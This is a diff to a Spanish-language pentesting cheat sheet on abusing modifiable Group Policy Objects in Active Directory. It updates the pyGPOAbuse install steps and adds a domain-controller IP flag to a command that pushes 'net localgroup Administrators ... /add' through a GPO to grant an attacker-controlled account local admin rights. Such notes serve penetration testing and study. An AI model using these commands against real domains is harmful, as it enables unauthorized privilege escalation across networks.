@@ -12,11 +12,8 @@ En BloodHound se puede ver el identificador de la GPO a la cual se tiene privile
 - ``Distinguished Name : CN={6AC1786C-016F-11D2-945F-00C04FB984F9},CN=POLICIES,CN=SYSTEM,DC=Domain,DC=local``
 
 ```bash 
-# Clonar el repositorio 
-❯ git clone https://github.com/Hackndo/pyGPOAbuse.git
- 
-# Instalar los requerimientos para usar la tool 
-❯ pip3 install -r reqirements.txt --break-system-packages 
+# Clonar el repositorio e instalarlo en un entorno virtual 
+❯ python3 -m venv gpoabuse_env && source gpoabuse_env/bin/activate && git clone https://github.com/Hackndo/pyGPOAbuse.git && cd pyGPOAbuse && pip3 install -r requirements.txt 
 ```
 
 ```bash 
@@ -24,7 +21,7 @@ En BloodHound se puede ver el identificador de la GPO a la cual se tiene privile
 
 Paso 1:
 # Abusar de una GPO sobre la que el usuario tiene permisos de modificación, agregando un comando que se ejecutará cuando la GPO se aplique.
-❯ python3 pygpoabuse.py <DOMAIN>/<USER>:'<PASS>' -gpo-id <GPO-GUID> -command 'net localgroup Administrators <ControlledAccount> /add' -f
+❯ python3 pygpoabuse.py <DOMAIN>/<USER>:'<PASS>' -gpo-id <GPO-GUID> -command 'net localgroup Administrators <ControlledAccount> /add' -dc-ip IP_DC -f
 
 	# GPO-GUID = 6AC1786C-016F-11D2-945F-00C04FB984F9
 	# command = Asignar al usuario ControlledAccount cuenta privilegiada 
